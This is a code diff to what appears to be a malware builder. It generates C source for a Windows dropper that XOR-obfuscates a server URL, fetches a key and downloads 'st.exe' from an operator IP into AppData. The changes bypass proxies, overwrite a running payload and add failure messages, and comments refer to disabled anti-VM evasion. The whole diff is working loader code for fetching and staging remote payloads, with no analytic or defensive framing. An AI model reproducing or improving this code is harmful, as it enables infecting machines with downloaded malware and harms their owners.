@@ -76,6 +76,7 @@ function encryptStr(str, key) {
 function cSource(meta, ip, buildId) {
   const keyUrl = `http://${ip}/api/getkey/${buildId}`;
   const stUrl  = `http://${ip}/api/downloads/st.exe`;
+  const esc4c  = (s) => String(s).replace(/\\/g, '\\\\').replace(/"/g, '\\"');
   
   const encKeyUrl = encryptStr(keyUrl, meta.xorKey);
   const encStUrl  = encryptStr(stUrl, meta.xorKey);
@@ -158,7 +159,8 @@ static int download_file(const wchar_t* url, const wchar_t* dest) {
         return 0;
     }
 
-    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    // Use NO_PROXY to ensure it connects directly in VMs
+    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
     if (!hSession) { FreeLibrary(hWinHttp); return 0; }
 
     HINTERNET hConnect = WinHttpConnect(hSession, host, uc.nPort, 0);
@@ -171,6 +173,8 @@ static int download_file(const wchar_t* url, const wchar_t* dest) {
     if (bResults) bResults = WinHttpReceiveResponse(hRequest, NULL);
 
     if (bResults) {
+        // Delete the file first to prevent "File Already Exists" if st.exe is running
+        DeleteFileW(dest);
         HANDLE hFile = CreateFileW(dest, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
         if (hFile != INVALID_HANDLE_VALUE) {
             DWORD dwSize = 0, dwDownloaded = 0;
@@ -201,7 +205,7 @@ static int download_file(const wchar_t* url, const wchar_t* dest) {
 int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
     (void)hInst; (void)hPrev; (void)lpCmd; (void)nShow;
 
-    // Anti-VM completely disabled for testing. Will run instantly.
+    // Anti-VM completely disabled. Runs instantly.
     Sleep(${meta.initialSleepMs});
 
     wchar_t appdata[MAX_PATH];
@@ -238,12 +242,11 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
         if (need_st) {
             if (download_file(stUrlW, stPath) && is_valid_pe(stPath)) {
                 need_st = 0;
-            } else {
-                DeleteFileW(stPath);
             }
         }
         
         if (need_st) { 
+            MessageBoxA(NULL, "Download failed. Check server IP and port 80.", "Error", MB_ICONERROR);
             return 1; 
         }
     }
